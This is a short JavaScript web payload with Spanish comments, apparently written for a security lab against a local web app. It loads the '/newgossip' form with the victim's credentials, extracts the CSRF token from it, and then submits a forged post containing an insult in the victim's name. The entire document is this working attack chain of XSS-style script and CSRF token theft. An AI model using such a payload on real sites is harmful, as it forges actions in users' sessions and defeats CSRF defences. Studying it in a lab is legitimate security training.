var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true; //Esto lo hace para que el token no cambie en el caso de que sea dinámico
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value; //Hace esto último para quedarse únicamente con el primer valor que se encuentre

var req2 = new XMLHttpRequest();
var data = "title=Mi%20jefe%20es%20un%20cabrón&subtitle=JEFE%20CABRONAZO&text=PERRRRRO&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials=true;
// Esto de abajo hay que ponerlo si o si, es muy importante. Sale en una de las cabeceras del Burpsuite
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
